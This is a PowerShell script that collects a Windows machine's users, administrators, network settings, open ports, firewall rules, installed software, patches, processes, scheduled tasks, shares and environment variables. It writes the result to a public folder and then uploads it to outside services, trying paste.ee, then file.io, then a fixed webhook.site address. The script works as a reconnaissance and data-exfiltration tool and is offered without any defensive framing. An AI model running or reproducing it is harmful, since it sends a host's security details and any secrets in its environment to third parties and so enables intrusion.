Write-Host "[*] Starting enumeration..." -ForegroundColor Cyan

$out = @()

Write-Host "[*] Collecting hostname..." -ForegroundColor Yellow
$out += "=== HOSTNAME ==="; $out += hostname

Write-Host "[*] Collecting OS info..." -ForegroundColor Yellow
$out += "=== OS INFO ==="; $out += (Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber, CsName | Out-String)

Write-Host "[*] Collecting current user..." -ForegroundColor Yellow
$out += "=== CURRENT USER ==="; $out += (whoami /all)

Write-Host "[*] Collecting local users..." -ForegroundColor Yellow
$out += "=== LOCAL USERS ==="; $out += (Get-LocalUser | Out-String)

Write-Host "[*] Collecting local groups..." -ForegroundColor Yellow
$out += "=== LOCAL GROUPS ==="; $out += (Get-LocalGroup | Out-String)

Write-Host "[*] Collecting administrators..." -ForegroundColor Yellow
$out += "=== ADMINISTRATORS ==="; $out += (Get-LocalGroupMember -Group "Administrators" | Out-String)

Write-Host "[*] Collecting network interfaces..." -ForegroundColor Yellow
$out += "=== NETWORK INTERFACES ==="; $out += (Get-NetIPAddress | Out-String)

Write-Host "[*] Collecting routing table..." -ForegroundColor Yellow
$out += "=== ROUTING TABLE ==="; $out += (Get-NetRoute | Out-String)

Write-Host "[*] Collecting open ports..." -ForegroundColor Yellow
$out += "=== OPEN PORTS ==="; $out += (Get-NetTCPConnection | Where-Object State -eq 'Listen' | Out-String)

Write-Host "[*] Collecting ARP table..." -ForegroundColor Yellow
$out += "=== ARP TABLE ==="; $out += (Get-NetNeighbor | Out-String)

Write-Host "[*] Collecting DNS servers..." -ForegroundColor Yellow
$out += "=== DNS SERVERS ==="; $out += (Get-DnsClientServerAddress | Out-String)

Write-Host "[*] Collecting hosts file..." -ForegroundColor Yellow
$out += "=== HOSTS FILE ==="; $out += (Get-Content C:\Windows\System32\drivers\etc\hosts)

Write-Host "[*] Collecting firewall profiles..." -ForegroundColor Yellow
$out += "=== FIREWALL PROFILES ==="; $out += (Get-NetFirewallProfile | Out-String)

Write-Host "[*] Collecting firewall rules..." -ForegroundColor Yellow
$out += "=== FIREWALL RULES ==="; $out += (Get-NetFirewallRule | Where-Object Enabled -eq 'True' | Select-Object DisplayName, Direction, Action | Out-String)

Write-Host "[*] Collecting installed software..." -ForegroundColor Yellow
$out += "=== INSTALLED SOFTWARE ==="; $out += (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)

Write-Host "[*] Collecting installed software (32bit)..." -ForegroundColor Yellow
$out += "=== INSTALLED SOFTWARE (32bit) ==="; $out += (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)

Write-Host "[*] Collecting running services..." -ForegroundColor Yellow
$out += "=== RUNNING SERVICES ==="; $out += (Get-Service | Where-Object Status -eq 'Running' | Out-String)

Write-Host "[*] Collecting processes..." -ForegroundColor Yellow
$out += "=== PROCESSES ==="; $out += (Get-Process | Out-String)

Write-Host "[*] Collecting scheduled tasks..." -ForegroundColor Yellow
$out += "=== SCHEDULED TASKS ==="; $out += (Get-ScheduledTask | Where-Object State -ne 'Disabled' | Out-String)

Write-Host "[*] Collecting startup items..." -ForegroundColor Yellow
$out += "=== STARTUP ITEMS ==="; $out += (Get-CimInstance Win32_StartupCommand | Out-String)

Write-Host "[*] Collecting shares..." -ForegroundColor Yellow
$out += "=== SHARES ==="; $out += (Get-SmbShare | Out-String)

Write-Host "[*] Collecting hotfixes..." -ForegroundColor Yellow
$out += "=== HOTFIXES ==="; $out += (Get-HotFix | Out-String)

Write-Host "[*] Collecting environment variables..." -ForegroundColor Yellow
$out += "=== ENVIRONMENT VARIABLES ==="; $out += (Get-ChildItem Env: | Out-String)

Write-Host "[*] Collecting drives..." -ForegroundColor Yellow
$out += "=== DRIVES ==="; $out += (Get-PSDrive | Out-String)

Write-Host "[+] Enumeration complete. Preparing upload..." -ForegroundColor Green

$body = $out -join "`n"
$uploaded = $false

# Save locally first so we always have a copy
$body | Out-File -FilePath C:\Users\Public\inventory.txt -Encoding UTF8
Write-Host "[+] Local copy saved to C:\Users\Public\inventory.txt" -ForegroundColor Green

# Method 1: paste.ee
Write-Host "[*] Trying paste.ee..." -ForegroundColor Cyan
try {
    $payload = ConvertTo-Json @{sections=@(@{name="inventory";syntax="text";contents=$body})}
    $response = Invoke-RestMethod -Uri "https://paste.ee/api/paste" -Method Post -ContentType "application/json" -Body $payload -Headers @{Accept="application/json"}
    Write-Host "[+] paste.ee success!" -ForegroundColor Green
    Write-Host "[+] Response: $($response | ConvertTo-Json -Depth 5)" -ForegroundColor Green
    $uploaded = $true
} catch {
    Write-Host "[-] paste.ee failed: $($_.Exception.Message)" -ForegroundColor Red
}

# Method 2: file.io
if (-not $uploaded) {
    Write-Host "[*] Trying file.io..." -ForegroundColor Cyan
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\inventory.txt")
        $fileEnc = [System.Text.Encoding]::UTF8.GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"inventory.txt`"",
            "Content-Type: text/plain",
            "",
            $fileEnc,
            "--$boundary--"
        )
        $multipartBody = $bodyLines -join "`r`n"
        $response = Invoke-RestMethod -Uri "https://file.io/?expires=1d" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $multipartBody
        Write-Host "[+] file.io success!" -ForegroundColor Green
        Write-Host "[+] URL: $($response.link)" -ForegroundColor Green
        $uploaded = $true
    } catch {
        Write-Host "[-] file.io failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Method 3: webhook.site
if (-not $uploaded) {
    Write-Host "[*] Trying webhook.site..." -ForegroundColor Cyan
    try {
        $response = Invoke-RestMethod -Uri "https://webhook.site/876989bb-721a-41a8-8fc4-0f8c381bd65d" -Method Post -Body $body -ContentType "text/plain; charset=utf-8"
        Write-Host "[+] webhook.site success!" -ForegroundColor Green
        $uploaded = $true
    } catch {
        Write-Host "[-] webhook.site failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

if (-not $uploaded) {
    Write-Host "[-] All upload methods failed. Retrieve file manually from C:\Users\Public\inventory.txt" -ForegroundColor Red
} else {
    Write-Host "[+] Done." -ForegroundColor Green
}
